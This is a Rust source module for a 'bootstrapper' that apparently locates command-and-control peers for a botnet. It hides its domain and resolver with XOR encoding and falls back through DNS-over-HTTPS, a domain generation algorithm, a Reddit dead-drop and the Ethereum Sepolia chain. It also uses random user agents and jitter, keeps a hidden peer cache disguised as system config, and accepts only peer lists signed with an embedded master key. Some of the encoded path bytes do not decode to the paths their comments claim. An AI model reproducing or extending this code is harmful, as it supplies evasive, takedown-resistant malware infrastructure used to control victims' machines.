pub mod doh;
pub mod dga;
pub mod reddit;
pub mod blockchain;

use std::error::Error;
use std::time::Duration;
use std::sync::Arc;
use log::{info, debug, warn};
use base64::{Engine as _, engine::general_purpose};
use ed25519_dalek::{Verifier, VerifyingKey, Signature};
use rand::Rng;

// Re-export providers for easier access if necessary
pub use doh::{DohProvider, HttpProvider};
pub use dga::DgaProvider;
pub use reddit::RedditProvider;
pub use blockchain::EthProvider;

const CONNECT_TIMEOUT_SEC: u64 = 15;

/// XOR decode helper
fn xd(encoded: &[u8], key: u8) -> String {
    encoded.iter().map(|b| (*b ^ key) as char).collect()
}

const MASTER_PUB_KEY: [u8; 32] = [
    0x75, 0xbf, 0x34, 0x60, 0xf7, 0x00, 0x57, 0x06, 
    0xa3, 0x82, 0x85, 0x4d, 0x0b, 0x31, 0xc7, 0x63, 
    0x30, 0x4d, 0x15, 0x19, 0x18, 0xd1, 0xca, 0x87, 
    0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
];

/// Bootstrap provider trait (synchronous - runs in blocking thread)
pub trait BootstrapProvider: Send + Sync {
    fn fetch_payload(&self) -> Result<String, Box<dyn Error + Send + Sync>>;
    fn name(&self) -> String;
}

pub struct ProfessionalBootstrapper {
    primary_providers: Vec<Arc<dyn BootstrapProvider>>,
    fallback_providers: Vec<Arc<dyn BootstrapProvider>>,
    user_agent: String,
}

impl ProfessionalBootstrapper {
    pub fn new() -> Self {
        let user_agents = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        ];
        let ua = user_agents[rand::thread_rng().gen_range(0..user_agents.len())].to_string();
        
        let mut bs = Self {
            primary_providers: Vec::new(),
            fallback_providers: Vec::new(),
            user_agent: ua,
        };

        // 1. Primary: dht.polydevs.uk
        // "dht.polydevs.uk" XOR 0x77
        let domain_enc = [0x13, 0x1f, 0x03, 0x59, 0x07, 0x18, 0x1b, 0x0e, 0x13, 0x12, 0x01, 0x04, 0x59, 0x02, 0x1c];
        // "https://dns.google/resolve" XOR 0x77
        let resolver_enc = [0x1f, 0x03, 0x03, 0x07, 0x04, 0x4d, 0x58, 0x58, 0x13, 0x19, 0x04, 0x59, 0x10, 0x18, 0x18, 0x10, 0x1b, 0x12, 0x58, 0x05, 0x12, 0x04, 0x18, 0x1b, 0x01, 0x12];
        
        bs.primary_providers.push(Arc::new(DohProvider {
            domain: xd(&domain_enc, 0x77),
            resolver_url: xd(&resolver_enc, 0x77),
        }));

        // 2. Secondary: DGA
        bs.fallback_providers.push(Arc::new(DgaProvider {
            resolver_url: xd(&resolver_enc, 0x77),
        }));
        
        bs
    }
    
    pub fn add_provider(&mut self, provider: Arc<dyn BootstrapProvider>) {
        self.primary_providers.push(provider);
    }
    
    /// Race providers in a tier - returns first successful result
    async fn race_tier(&self, tier: &[Arc<dyn BootstrapProvider>]) -> Option<Vec<(String, u16)>> {
        if tier.is_empty() { return None; }
        
        // Run all providers concurrently using smol::unblock for blocking I/O
        let mut handles = Vec::new();
        for provider in tier {
            let p = provider.clone();
            handles.push(smol::spawn(async move {
                // Run blocking HTTP in thread pool
                smol::unblock(move || {
                    // Add jitter
                    std::thread::sleep(Duration::from_millis(
                        rand::thread_rng().gen_range(0..1000)
                    ));
                    crate::k::debug::log_detail!("Provider {} fetching...", p.name());
                    match p.fetch_payload() {
                        Ok(payload) => {
                             crate::k::debug::log_detail!("Provider {} success. Verifying sig...", p.name());
                             verify_signature(&payload).map(|ips| (p.name(), ips))
                        },
                        Err(e) => {
                            crate::k::debug::log_detail!("Provider {} failed: {}", p.name(), e);
                            Err(e)
                        },
                    }
                }).await
            }));
        }
        
        // Wait for first successful result
        for handle in handles {
            match handle.await {
                Ok((source_name, peers)) => {
                    info!("[Bootstrap] SUCCESS via {}. Found {} peers.", source_name, peers.len());
                    crate::k::debug::log_op!("Bootstrap", format!("Tier Success: {} ({} peers)", source_name, peers.len()));
                    return Some(peers);
                }
                _ => {}
            }
        }
        None
    }

    /// Try to load peers from local persistent cache (Tier 0)
    fn load_cache_peers(&self) -> Option<Vec<(String, u16)>> {
        // Obfuscated paths: "C:\ProgramData\SysConfig\net.cache" XOR 0x22
        // and "/var/tmp/.net_cache" XOR 0x22
        let path = if cfg!(target_os = "windows") {
            xd(&[0x61, 0x5a, 0x3c, 0x52, 0x74, 0x6f, 0x65, 0x74, 0x63, 0x6f, 0x40, 0x63, 0x76, 0x63, 0x3c, 0x51, 0x7b, 0x75, 0x41, 0x6f, 0x68, 0x66, 0x69, 0x65, 0x3c, 0x6c, 0x47, 0x76, 0x22, 0x45, 0x63, 0x45, 0x6a, 0x47], 0x22)
        } else {
            xd(&[0x0d, 0x78, 0x43, 0x74, 0x0d, 0x76, 0x6f, 0x72, 0x0d, 0x22, 0x6c, 0x47, 0x76, 0x61, 0x45, 0x63, 0x45, 0x6a, 0x47], 0x22)
        };

        if let Ok(contents) = std::fs::read_to_string(&path) {
             if let Ok(peers) = parse_ip_list(&contents) {
                 return Some(peers);
             }
        }
        None
    }

    /// Save successful peers to local cache
    pub fn save_cache_peers(&self, peers: &[(String, u16)]) {
        // Obfuscated paths
        let path = if cfg!(target_os = "windows") {
            xd(&[0x61, 0x5a, 0x3c, 0x52, 0x74, 0x6f, 0x65, 0x74, 0x63, 0x6f, 0x40, 0x63, 0x76, 0x63, 0x3c, 0x51, 0x7b, 0x75, 0x41, 0x6f, 0x68, 0x66, 0x69, 0x65, 0x3c, 0x6c, 0x47, 0x76, 0x22, 0x45, 0x63, 0x45, 0x6a, 0x47], 0x22)
        } else {
            xd(&[0x0d, 0x78, 0x43, 0x74, 0x0d, 0x76, 0x6f, 0x72, 0x0d, 0x22, 0x6c, 0x47, 0x76, 0x61, 0x45, 0x63, 0x45, 0x6a, 0x47], 0x22)
        };
        
        if let Some(parent) = std::path::Path::new(&path).parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        
        let mut content = String::new();
        for (ip, port) in peers {
            content.push_str(&format!("{}:{};", ip, port));
        }
        
        let _ = std::fs::write(&path, content);
    }

    pub async fn resolve(&self) -> Option<Vec<(String, u16)>> {
        info!("[Bootstrap] Starting Tiered Resolution.");
        
        // Tier 0: Local Persistence
        if let Some(nodes) = self.load_cache_peers() {
            crate::k::debug::log_op!("Bootstrap", "Loaded from Local Cache (Tier 0)");
            return Some(nodes);
        }
        
        // Tier 1: Primary (DoH)
        info!("[Bootstrap] Attempting Tier 1 (DoH/Home)...");
        crate::k::debug::log_op!("Bootstrap", "Starting Tier 1 (DoH)...");
        if let Some(nodes) = self.race_tier(&self.primary_providers).await {
            return Some(nodes);
        }

        // Tier 2: Reddit
        info!("[Bootstrap] Tier 1 Failed. Attempting Tier 2 (Reddit)...");
        let reddit_provider: Arc<dyn BootstrapProvider> = Arc::new(RedditProvider);
        let reddit_tier = vec![reddit_provider];
        if let Some(nodes) = self.race_tier(&reddit_tier).await {
             return Some(nodes);
        }

        // Tier 3: Fallback (DGA)
        info!("[Bootstrap] Tier 2 Failed. Attempting Tier 3 (DGA)...");
        if let Some(nodes) = self.race_tier(&self.fallback_providers).await {
            return Some(nodes);
        }

        // Tier 4: Blockchain
        info!("[Bootstrap] Tier 3 Failed. Attempting Tier 4 (Sepolia Blockchain)...");
        use crate::d::eth_listener;
        if let Some((nodes, _blob)) = eth_listener::check_sepolia_fallback().await {
             info!("[Bootstrap] SUCCESS via Tier 4 (Sepolia). Found {} peers.", nodes.len());
             return Some(nodes);
        }

        warn!("[Bootstrap] All Tiers Failed.");
        None
    }
}

fn verify_signature(text: &str) -> Result<Vec<(String, u16)>, Box<dyn Error + Send + Sync>> {
    let text = text.trim();
    let parts: Vec<&str> = text.split('|').collect();

    if parts.len() != 2 {
        return Err("Invalid Payload Format (Required SIG|MSG)".into());
    }

    let sig_part = parts[0].strip_prefix("SIG:").ok_or("Missing SIG prefix")?;
    let msg_part = parts[1].strip_prefix("MSG:").ok_or("Missing MSG prefix")?;

    let sig_bytes = general_purpose::STANDARD.decode(sig_part)?;
    let msg_bytes = general_purpose::STANDARD.decode(msg_part)?;

    let vk = VerifyingKey::from_bytes(&MASTER_PUB_KEY).map_err(|_| "Invalid PubKey")?;
    
    crate::k::debug::log_detail!("Verifying Signature ({} bytes msg, {} bytes sig)...", msg_bytes.len(), sig_bytes.len());
    
    let signature = Signature::from_bytes(&sig_bytes.try_into().map_err(|_| "Invalid Sig Len")?);
    
    vk.verify(&msg_bytes, &signature).map_err(|e| format!("Crypto Fail: {}", e))?;
    
    debug!("[Bootstrap] Logic Signature Verified.");
    crate::k::debug::log_detail!("Signature VALID.");
    
    let msg_str = String::from_utf8(msg_bytes)?;
    parse_ip_list(&msg_str)
}

fn parse_ip_list(decoded_str: &str) -> Result<Vec<(String, u16)>, Box<dyn Error + Send + Sync>> {
    let mut peers = Vec::new();
    for part in decoded_str.split(';') {
        if part.is_empty() { continue; }
        if let Some((ip, port_str)) = part.split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                peers.push((ip.to_string(), port));
            }
        }
    }
    if peers.is_empty() {
        return Err("No legitimate peers parsed".into());
    }
    Ok(peers)
}
